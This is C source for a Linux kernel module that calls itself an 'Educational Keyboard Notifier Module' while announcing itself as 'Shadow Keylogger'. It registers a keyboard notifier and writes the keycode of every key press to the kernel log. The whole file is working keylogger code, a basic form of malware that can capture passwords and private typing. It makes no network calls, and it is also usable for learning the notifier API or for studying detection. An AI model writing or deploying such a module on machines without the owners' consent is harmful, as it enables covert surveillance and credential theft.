#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Abhi");
MODULE_DESCRIPTION("Educational Keyboard Notifier Module");


static int kb_notifier_callback(struct notifier_block *nb, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = data;

    
    if (action == KBD_KEYCODE && param->down) {
       
        printk(KERN_INFO "SHADOW_LOG: %d\n", param->value);
    }

    return NOTIFY_OK; // Tell the kernel we received the message
}


static struct notifier_block kb_nb = {
    .notifier_call = kb_notifier_callback
};


static int __init shadow_init(void) {
    printk(KERN_INFO "Shadow Keylogger: Loaded. Monitoring keyboard...\n");
    // Register our callback
    register_keyboard_notifier(&kb_nb);
    return 0;
}


static void __exit shadow_exit(void) {
    
    unregister_keyboard_notifier(&kb_nb);
    printk(KERN_INFO "Shadow Keylogger: Unloaded.\n");
}

module_init(shadow_init);
module_exit(shadow_exit);
